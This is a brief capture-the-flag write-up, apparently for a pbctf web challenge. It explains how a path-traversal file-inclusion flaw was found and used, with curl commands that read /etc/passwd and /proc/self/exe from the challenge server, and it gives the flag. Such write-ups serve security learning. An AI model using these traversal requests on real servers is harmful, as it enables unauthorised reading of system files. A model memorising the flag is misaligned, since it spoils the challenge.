* Visit http://34.68.159.75:37173/robots.txt
* We see there is a /secret directory. Visit that and there are few notes.
* some Fuzzing reveals there is LFI at `http://34.68.159.75:37173/secret/../../../../../../etc/passwd` 
	* curl --path-as-is "http://34.68.159.75:37173/secret/../../../../../../etc/passwd"
	* open using curl/burp as browser will path normalize
* visit `http://34.68.159.75:37173/secret/../../../../../../proc/self/exe` and you will get the flag
 	* curl --path-as-is "http://34.68.159.75:41521/secret/../../../../../proc/self/exe" 2>&1 | strings | grep pbctf

 pbctf{n0t_re4lly_apache_ap0che!}
